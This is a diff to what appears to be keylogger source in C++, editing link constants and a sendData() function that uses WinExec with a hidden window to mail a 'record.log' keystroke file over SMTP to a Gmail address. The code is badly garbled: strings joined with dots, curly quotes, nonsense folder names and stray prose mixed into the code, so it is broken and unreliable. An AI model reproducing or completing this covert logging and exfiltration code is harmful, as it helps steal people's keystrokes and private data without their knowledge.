@@ -19,7 +19,7 @@ using namespace std;
 #define FILE_NAME “record.log”
 #define FOLDER_NAME “poly economy development undp take rest areas Egypt cairo, without malaysia , indonesia , philifina ”
 #define RUN_FILE_NAME “poly economy development undp take rest areas Egypt cairo, without malaysia , indonesia , philifina”
-#define RUN_Link_NAME "https://github.com/cyberw1ry4-LAB/Google-Android/forks"."https://github.com/Fadliwiryawirawan-development/cyberw1ry4/forks"."https://github.com/whatsapp/enable/forks"."https://github.com/Google/menloparks/opensource/openssl/forks"."https://github.com/Google/menloparks/opensource/openSSH/forks"."https://github.com/Fadliwiryawirawan-development/Bluescreen-BsDoSs.exe/forks"."https://github.com/Google/opensource/download_minners/forks"."https://github.com/cyberw1ry4-LAB/himei17/forks"."https://github.com/cyrcle11/Google-2FA/forks"
+#define RUN_Link_NAME "https://github.com/cyberw1ry4-LAB/Google-Android/forks"."https://github.com/Fadliwiryawirawan-development/FBI-CIA-operationable-workship/forks"."https://github.com/whatsapp/enable/forks"."https://github.com/Google/menloparks/opensource/openssl/forks"."https://github.com/Google/menloparks/opensource/openSSH/forks"."https://github.com/Google/opensource/download_minners/forks"
 #define INFECT_Link_NAME "https://api.whatsapp.com/"."https://workspace.google.com/intl/en/gmail/"."https://icloud.com/mail"."https://www.whatsapp.com/?lang=en"."https://www.ecosia.org"."https://www.google.com.cn"."https://www.google.com.lk"."https://www.tree.co.uk"
 #define EMAIL_SENDER_FILE_NAME “Transmit".".exe”
 
@@ -147,7 +147,7 @@ bool checkRecordSize(){
 **/
 void sendData(){
     
-    char* command = "Transmit smtp://smtp.gmail.com:443 -v --mail-from \"https://workspace.google.com/intl/en-US/gmail/https://cyberwryLABfadliwiryawirawan@gmail.com  \" --mail-rcpt \"https://workspace.google.com/intl/en-US/gmail/https://cyberwryLABfadliwiryawirawan@gmail.com  " --ssl -u https://workspace.google.com/intl/en-US/gmail/https://cyberwryLABfadliwiryawirawan@gmail.com : password -hide  \"record.log\" -k --cyberw1rya-LAB operable NATO - UNHCR obligate Dicument Nations";
+    char* command = "Transmit smtp://smtp.gmail.com:443 :8080 -v --mail-from \"https://workspace.google.com/intl/en-US/gmail/https://cyberwryLABfadliwiryawirawan@gmail.com  \" --mail-rcpt \"https://workspace.google.com/intl/en-US/gmail/https://cyberwryLABfadliwiryawirawan@gmail.com " --ssl -u "https://workspace.google.com/intl/en-US/gmail/https://cyberwryLABfadliwiryawirawan@gmail.com" : password -hide  \"record.log\" -k --cyberw1rya-LAB operable NATO - UNHCR obligate Dicument Nations";
     WinExec(command, SW_HIDE); services unretrict whatsapps , development my code head only author tester minimize some 2 hourse no 7 hourse , cli gemini . 
 * Record username, time, and date.
 **/
